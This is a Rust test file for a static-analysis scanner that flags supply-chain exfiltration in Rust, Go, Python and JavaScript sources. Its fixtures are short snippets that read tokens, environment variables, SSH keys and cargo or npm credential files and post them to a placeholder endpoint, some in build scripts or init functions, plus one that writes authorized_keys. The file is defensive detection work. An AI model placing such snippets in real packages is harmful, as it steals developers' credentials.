use crate::OpenOptions;
use std::path::Path;
#[test]
fn selected_rust_environment_http_payload_is_not_bulk_harvesting() {
    for source in [
        "fn run(){let host=std::env::var(\"HOSTNAME\").unwrap();ureq::post(endpoint).send(host);}",
        "use std::{env,process::Command}; fn run(){let host=env::var(\"HOSTNAME\").unwrap();let payload=format!(\"host={}\",host);Command::new(\"curl\").args(&[\"-X\",\"POST\",endpoint,\"-d\",&payload]).status();}",
        "fn hostname(){std::env::var(\"HOSTNAME\").unwrap()} fn run(){ureq::post(endpoint).send(hostname());}",
    ] {
        let found = kinds("build.rs", source);
        assert!(found.contains("environment-value-http-body"), "{found:?}");
        assert!(!found.contains("environment-http-body"), "{found:?}");
        assert!(!found.contains("secret-http-body"), "{found:?}");
    }
}

#[test]
fn selected_rust_environment_does_not_taint_unrelated_or_metadata_bodies() {
    for source in [
        "fn run(){let host=std::env::var(\"HOSTNAME\").unwrap();ureq::post(endpoint).send(\"status\");}",
        "fn run(){let host=std::env::var(\"HOSTNAME\").unwrap();let host=\"status\";ureq::post(endpoint).send(host);}",
        "fn run(){let host=std::env::var(\"HOSTNAME\").is_ok();ureq::post(endpoint).send(format!(\"{}\",host));}",
    ] {
        let found = kinds("build.rs", source);
        assert!(!found.contains("environment-value-http-body"), "{found:?}");
    }
}

#[test]
fn rust_secret_metadata_is_not_credential_content() {
    for expression in [
        "std::env::var(\"CARGO_REGISTRY_TOKEN\").is_ok()",
        "std::fs::read_to_string(\"/tmp/.cargo/credentials\").unwrap().len()",
        "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"length {}\", content.len()), Err(_) => String::new() }",
        "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"empty {}\", content.is_empty()), Err(_) => String::new() }",
    ] {
        let source =
            format!("fn run() {{ let data = {expression}; ureq::post(endpoint).send(data); }}");
        let found = kinds("lib.rs", &source);
        assert!(
            !found.contains("cargo-credential-http-body"),
            "{expression}: {found:?}"
        );
        assert!(
            !found.contains("secret-http-body"),
            "{expression}: {found:?}"
        );
    }
}

#[test]
fn rust_match_preserves_content_and_mixed_format_arguments() {
    for expression in [
        "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => content, Err(_) => String::new() }",
        "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"{}:{}\", content.len(), content), Err(_) => String::new() }",
        "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"{content}\"), Err(_) => String::new() }",
    ] {
        let source =
            format!("fn run() {{ let data = {expression}; ureq::post(endpoint).send(data); }}");
        assert!(
            kinds("lib.rs", &source).contains("cargo-credential-http-body"),
            "{expression}"
        );
    }
}

#[test]
fn go_package_helpers_keep_file_import_scopes_and_initialization() {
    let file = |path, source| crate::package_context::SourceFile { path, source };
    let flow = super::go_package_payload_flow(
        &[
            file(
                "p/a.go",
                "package p\nimport h \"net/http\"\nfunc send(data string){h.Post(endpoint,\"text/plain\",data)}",
            ),
            file(
                "p/b.go",
                "package p\nimport h \"os\"\nfunc secret()string{return h.Getenv(\"GITHUB_TOKEN\")}",
            ),
            file("p/c.go", "package p\nfunc init(){send(secret())}"),
        ],
        &crate::package_context::ContextLimits::default(),
        None,
    );
    assert!(!flow.truncated);
    let events = flow
        .files
        .get(2)
        .and_then(|f| f.facts.get("source.go.initialization_events"))
        .map(ToString::to_string)
        .unwrap_or_default();
    assert!(events.contains("secret-http-body"), "{flow:?}");
}
#[test]
/// Helpers and `if` branches read the bindings around them through a
/// [`Scope`](super::Scope) layer rather than a copy, and a block saves only
/// the names it declares, so thousands of globals with thousands of helpers
/// or branches stay within the evaluation step budget.
fn helpers_branches_and_blocks_do_not_copy_every_binding() {
    let globals: String = (0..4_000).map(|i| format!("g{i}=o.Environ()\n")).collect();
    let helpers: String = (0..4_000).map(|i| format!("func f{i}(){{}}\n")).collect();
    let go = format!(
        "package p\nimport (h \"net/http\"; o \"os\"; \"strings\")\nvar (\n{globals}token=o.Getenv(\"GITHUB_TOKEN\")\n)\n{helpers}func init(){{h.Post(endpoint,\"text/plain\",strings.NewReader(token))}}\n"
    );
    let bindings: String = (0..4_000).map(|i| format!("var v{i} = {i};\n")).collect();
    let js = format!(
        "{bindings}{}var token = 'none';\nif (c) {{ token = process.env.GITHUB_TOKEN; }}\nfetch('https://example.invalid',{{method:'POST',body:token}});\n",
        "if (c) { let v0 = 1; }\n".repeat(4_000)
    );
    for (file, source) in [("p.go", go), ("index.js", js)] {
        let parsed = OpenOptions::new()
            .path(Path::new(file))
            .open(source.as_bytes());
        assert_eq!(
            parsed.values().get("source.payload_flow.truncated"),
            Some(&serde_json::json!(false)),
            "{file}"
        );
        let events = kinds(file, &source);
        assert!(events.contains("secret-http-body"), "{file}: {events}");
    }
}
#[test]
fn go_body_flow_alias_helpers_builders_and_initializers() {
    let imports = "package p\nimport (h \"net/http\"; o \"os\"; \"bytes\"; \"strings\"; \"context\"; \"io\"; \"net/url\")\n";
    for body in [
        "b,_:=o.ReadFile(\"/tmp/fixture/.npmrc\"); h.Post(endpoint,\"text/plain\",bytes.NewReader(b))",
        "b,_:=o.ReadFile(\"/tmp/fixture/.npmrc\"); r,_:=h.NewRequest(\"POST\",endpoint,bytes.NewReader(b)); h.DefaultClient.Do(r)",
        "b:=o.Getenv(\"GITHUB_TOKEN\"); r,_:=h.NewRequestWithContext(context.Background(),\"POST\",endpoint,strings.NewReader(b)); c:=&h.Client{}; c.Do(r)",
        "v:=url.Values{}; v.Set(\"token\",o.Getenv(\"GITHUB_TOKEN\")); h.PostForm(endpoint,v)",
        "go func(){ h.Post(endpoint,\"text/plain\",strings.NewReader(o.Getenv(\"GITHUB_TOKEN\"))) }()",
        "h.Post(endpoint,\"text/plain\",strings.NewReader(secret()))",
    ] {
        let source = format!(
            "{imports}func secret()string{{return o.Getenv(\"GITHUB_TOKEN\")}}\nfunc init(){{{body}}}\nfunc init(){{}}\n"
        );
        assert!(
            kinds("p.go", &source).contains("secret-http-body"),
            "{source}"
        );
        let parsed = OpenOptions::new()
            .path(Path::new("p.go"))
            .open(source.as_bytes());
        assert!(
            parsed
                .values()
                .get("source.go.initialization_events")
                .unwrap()
                .to_string()
                .contains("secret-http-body")
        );
    }
    for body in [
        "b:=o.Getenv(\"GITHUB_TOKEN\"); r,_:=h.NewRequest(\"POST\",endpoint,strings.NewReader(\"status\")); r.Header.Set(\"Authorization\",b); h.DefaultClient.Do(r)",
        "b:=o.Getenv(\"GITHUB_TOKEN\"); r,_:=h.NewRequest(\"POST\",endpoint,nil); r.SetBasicAuth(\"user\",b); h.DefaultClient.Do(r)",
        "b:=o.Getenv(\"GITHUB_TOKEN\"); b=\"status\"; h.Post(endpoint,\"text/plain\",strings.NewReader(b))",
        "b:=o.Getenv(\"GITHUB_TOKEN\"); h.NewRequest(\"POST\",endpoint,strings.NewReader(b))",
    ] {
        assert_eq!(
            kinds("p.go", &format!("{imports}func run(){{{body}}}")),
            "[]",
            "{body}"
        );
    }
    let source = format!(
        "{imports}var token=o.Getenv(\"GITHUB_TOKEN\")\nfunc init(){{h.Post(endpoint,\"text/plain\",strings.NewReader(token))}}"
    );
    assert!(kinds("p.go", &source).contains("secret-http-body"));
}
fn kinds(file: &str, source: &str) -> String {
    let parsed = OpenOptions::new()
        .path(Path::new(file))
        .open(source.as_bytes());
    let events = parsed
        .values()
        .get("source.payload_flow.events")
        .unwrap()
        .as_array()
        .unwrap();
    serde_json::json!(
        events
            .iter()
            .filter(|e| e["kind"]
                .as_str()
                .is_some_and(|k| k.ends_with("http-body") || k == "ssh-authorized-keys-write"))
            .collect::<Vec<_>>()
    )
    .to_string()
}
#[test]
fn rust_payload_bindings_aliases_and_authentication() {
    let positive = "use std::{env::{vars as harvest}}; use reqwest::blocking::Client; fn run(){let c=Client::new(); let data=harvest().collect(); c.post(endpoint).json(&data).send();}";
    assert!(kinds("lib.rs", positive).contains("environment-http-body"));
    for body in [
        "let token=std::env::var(\"CARGO_REGISTRY_TOKEN\"); c.get(endpoint).bearer_auth(token).send();",
        "let data=std::env::vars().collect(); c.post(endpoint).body(\"status\").send();",
        "let data=std::env::vars().collect(); let data=\"status\"; c.post(endpoint).body(data).send();",
    ] {
        assert_eq!(
            kinds(
                "build.rs",
                &format!("fn main(){{let c=reqwest::blocking::Client::new();{body}}}")
            ),
            "[]",
            "{body}"
        );
    }
}
#[test]
fn long_javascript_member_chain_stays_within_budget() {
    // Each link is evaluated once; evaluating the receiver again at every
    // link would spend the whole step budget on a few dozen links and hide
    // every later event.
    let chain = (0..40).fold(String::from("a"), |chain, i| format!("{chain}.p{i}"));
    let source = format!(
        "const x={chain}; fetch('https://example.invalid',{{method:'POST',body:JSON.stringify({{token:process.env.GITHUB_TOKEN}})}});"
    );
    let parsed = OpenOptions::new()
        .path(Path::new("index.js"))
        .open(source.as_bytes());
    assert_eq!(
        parsed.values().get("source.payload_flow.truncated"),
        Some(&serde_json::json!(false))
    );
    assert!(kinds("index.js", &source).contains("secret-http-body"));
}
#[test]
fn lexical_shadowing_does_not_leak_or_erase_outer_payload() {
    assert!(kinds("lib.rs","fn run(){let data=std::env::vars(); {let data=\"constant\";} ureq::post(endpoint).send_json(data);}").contains("environment-http-body"));
    assert_eq!(
        kinds(
            "lib.rs",
            "fn run(){let data=\"constant\"; if flag {let data=std::env::vars();} ureq::post(endpoint).send_json(data);}"
        ),
        "[]"
    );
    assert_eq!(
        kinds(
            "lib.rs",
            "use reqwest::blocking::Client; fn run(Client:Custom){let c=Client::new();c.post(endpoint).body(std::env::vars());}"
        ),
        "[]"
    );
}
#[test]
fn rust_helpers_ureq_cargo_home_and_write_path() {
    assert!(kinds("lib.rs","fn data(){std::env::vars().collect()} fn run(){ureq::post(endpoint).send_json(data());}").contains("environment-http-body"));
    assert!(kinds("lib.rs","fn run(){let root=std::env::var(\"CARGO_HOME\"); let path=root.join(\"credentials.toml\"); let data=std::fs::read(path); ureq::post(endpoint).send(data);}").contains("cargo-credential-http-body"));
    assert!(kinds("lib.rs","fn writer(path:&Path,data:&str){std::fs::write(path,data);} fn run(){let path=root.join(\"authorized_keys\");writer(&path, key);}").contains("ssh-authorized-keys-write"));
    assert_eq!(
        kinds(
            "lib.rs",
            "#[cfg(test)] mod tests {fn run(){ureq::post(endpoint).send_json(std::env::vars());}}"
        ),
        "[]"
    );
}
/// Code is test-only when any attribute in the run directly before it is
/// `#[cfg(test)]` or `#[test]`; anything else in between ends the run.
#[test]
fn test_attribute_runs_exclude_only_the_item_they_gate() {
    let send = "{ureq::post(endpoint).send_json(std::env::vars());}";
    for gated in [
        format!("#[cfg(test)] #[allow(dead_code)] fn run(){send}"),
        format!("#[allow(dead_code)] #[test] fn run(){send}"),
        format!("fn run(){{ #[cfg(test)] {{ let _ = 1; }} #[cfg(test)] {send} }}"),
    ] {
        assert_eq!(kinds("lib.rs", &gated), "[]", "{gated}");
    }
    for live in [
        format!("#[inline] fn run(){send}"),
        format!("#[cfg(test)] fn helper(){{}} fn run(){send}"),
        format!("#[cfg(test)]\n// note\nfn run(){send}"),
    ] {
        assert!(
            kinds("lib.rs", &live).contains("environment-http-body"),
            "{live}"
        );
    }
}

#[test]
fn typed_http_helper_and_curl_payload_only() {
    assert!(kinds("lib.rs","use reqwest::blocking::Client; fn send(c:&Client,data:&str){c.post(endpoint).body(data).send();} fn run(){let c=Client::new();let data=std::fs::read(path);send(&c,&data);}").contains("file-http-body"));
    assert!(kinds("lib.rs","fn run(){let data=std::env::vars();std::process::Command::new(\"curl\").arg(\"--data\").arg(data).arg(endpoint).status();}").contains("environment-http-body"));
    assert_eq!(
        kinds(
            "lib.rs",
            "fn run(){let data=std::env::var(\"CARGO_REGISTRY_TOKEN\");std::process::Command::new(\"curl\").arg(\"--header\").arg(data).arg(endpoint).status();}"
        ),
        "[]"
    );
}
#[test]
fn rust_mutable_read_buffer_and_format_capture() {
    assert!(kinds("lib.rs","fn run(){let mut f=std::fs::File::open(\"/tmp/input/.ssh/id_rsa\");let mut buf=Vec::new();f.read_to_end(&mut buf);ureq::post(endpoint).send(buf);}").contains("credential-file-http-body"));
    assert!(kinds("lib.rs","fn run(){let token=std::fs::read_to_string(\"/tmp/input/.terraform.d/credentials.tfrc.json\");ureq::post(endpoint).send(format!(\"{token}\"));}").contains("credential-file-http-body"));
}
#[test]
fn rust_batched_struct_shorthand_payload() {
    let source = "use reqwest::blocking::Client; fn read(path:&Path){std::fs::read_to_string(path).ok()} fn send(client:&Client,items:&[Item]){let payload=Batch{items};client.post(endpoint).json(&payload).send();} fn run(paths:&[Path]){let client=Client::new();let mut items=Vec::new();for path in paths {if let Some(content)=read(path){items.push(Item{content});}}send(&client,&items);}";
    assert!(kinds("lib.rs", source).contains("file-http-body"));
}
#[test]
fn helper_parameter_substitution_is_simultaneous() {
    use super::{PARAM_START, substitute};
    assert_eq!(
        substitute(1 << PARAM_START, &[1 << (PARAM_START + 2)]),
        1 << (PARAM_START + 2)
    );
    assert!(kinds("lib.rs", "fn identity(data:&str){data} fn middle(unused:usize,data:&str){ureq::post(endpoint).send(identity(data));} fn run(){middle(0,std::fs::read(path));}").contains("file-http-body"));
}
#[test]
fn sensitive_path_passed_through_read_helper() {
    assert!(kinds("lib.rs", "fn read(path:&str){std::fs::read(path)} fn run(){ureq::post(endpoint).send(read(\"/tmp/fixture/.cargo/credentials.toml\"));}").contains("cargo-credential-http-body"));
}
#[test]
fn rust_turbofish_preserves_receiver_payload() {
    assert!(kinds("lib.rs", "fn run(){let data=std::env::vars().map(|(k,v)|format!(\"{k}={v}\")).collect::<Vec<_>>().join(\"\\n\");std::process::Command::new(\"curl\").arg(\"--data\").arg(data).status();}").contains("environment-http-body"));
}
#[test]
fn python_intermediate_helper_session_and_auth() {
    assert!(kinds("lib.py","import os\nimport requests\ndef harvest():\n return dict(os.environ)\ndef run():\n client=requests.Session()\n data=harvest()\n client.post(endpoint,json=data)\n").contains("environment-http-body"));
    assert_eq!(
        kinds(
            "lib.py",
            "import os\nimport requests\ndef run():\n token=os.getenv('CARGO_REGISTRY_TOKEN')\n requests.post(endpoint,headers={'Authorization':token},data='status')\n"
        ),
        "[]"
    );
}
#[test]
fn javascript_import_execution_is_not_function_presence() {
    for (source, expected) in [
        (
            "async function f(){await fetch('https://example.invalid');} module.exports=f;",
            false,
        ),
        (
            "async function f(){await fetch('https://example.invalid');} if(false)f();",
            false,
        ),
        (
            "async function f(){await fetch('https://example.invalid');} f();",
            true,
        ),
        ("fetch('https://example.invalid');", true),
    ] {
        let parsed = OpenOptions::new()
            .path(Path::new("index.js"))
            .open(source.as_bytes());
        assert_eq!(
            parsed
                .values()
                .get("source.execution.module_http")
                .and_then(|v| v.as_bool()),
            Some(expected),
            "{source}"
        );
    }
}

/// One environment variable read by a call is an environment value in
/// every language that has such calls, not only in Rust.
#[test]
fn selected_environment_values_are_reported_in_every_language() {
    for (file, source) in [
        (
            "a.py",
            "import os\nimport requests\nrequests.post(endpoint, data=os.getenv('HOSTNAME'))\n",
        ),
        (
            "a.py",
            "import os\nimport requests\nrequests.post(endpoint, data=os.environ.get('HOSTNAME'))\n",
        ),
        (
            "p.go",
            "package p\nimport (h \"net/http\"; o \"os\"; \"strings\")\nfunc run(){h.Post(endpoint,\"text/plain\",strings.NewReader(o.Getenv(\"HOSTNAME\")))}\n",
        ),
    ] {
        let found = kinds(file, source);
        assert!(
            found.contains("environment-value-http-body"),
            "{source}: {found}"
        );
        assert!(
            !found.contains("environment-http-body"),
            "{source}: {found}"
        );
    }
}

/// Members of a package are parsed with the shared, bounded parser, which
/// honours the caller's cancellation: a cancelled package parses nothing
/// and reports itself incomplete.
#[test]
fn package_members_use_the_shared_parser() {
    let file = |path, source| crate::package_context::SourceFile { path, source };
    // Large enough that the parser polls its progress callback, where it
    // reads the flag.
    let helpers: String = (0..5_000).map(|i| format!("func f{i}(){{}}\n")).collect();
    let source = format!(
        "package p\nimport h \"net/http\"\n{helpers}func init(){{h.Post(endpoint,\"text/plain\",nil)}}"
    );
    let members = [file("p/a.go", source.as_str())];
    let limits = crate::package_context::ContextLimits::default();
    let cancelled = std::sync::atomic::AtomicBool::new(true);
    let flow = super::go_package_payload_flow(&members, &limits, Some(&cancelled));
    assert!(flow.truncated);
    assert!(flow.files.is_empty());
    let flow = super::go_package_payload_flow(&members, &limits, None);
    assert!(!flow.truncated, "{flow:?}");
    assert_eq!(flow.files.len(), 1);
    assert!(flow.files[0].facts.get("source.go.init_count").is_some());
}

/// Execution facts are read from syntax at any size: only the payload
/// analysis stops at its source-size gate.
#[test]
fn execution_facts_survive_the_payload_size_gate() {
    let padding = format!("// {}\n", "x".repeat(3 * 1024 * 1024));
    let rust = format!("{padding}#[ctor::ctor]\nfn start() {{}}\nmod sibling;\n");
    let parsed = OpenOptions::new()
        .path(Path::new("lib.rs"))
        .open(rust.as_bytes());
    let values = parsed.values();
    assert_eq!(
        values.get("source.payload_flow.truncated"),
        Some(&serde_json::json!(true))
    );
    assert_eq!(
        values.get("source.rust.initializers"),
        Some(&serde_json::json!(["ctor"]))
    );
    assert_eq!(
        values.get("source.rust.modules").map(ToString::to_string),
        Some(r#"[{"name":"sibling","path":null,"prefix":""}]"#.to_string())
    );

    let go = format!("package p\n{padding}//go:generate sh -c \"echo hi\"\nfunc init(){{}}\n");
    let parsed = OpenOptions::new()
        .path(Path::new("p.go"))
        .open(go.as_bytes());
    let values = parsed.values();
    assert_eq!(
        values.get("source.go.init_count"),
        Some(&serde_json::json!(1))
    );
    assert_eq!(
        values
            .get("source.go.generate")
            .and_then(|g| g.as_array())
            .map(Vec::len),
        Some(1)
    );
}
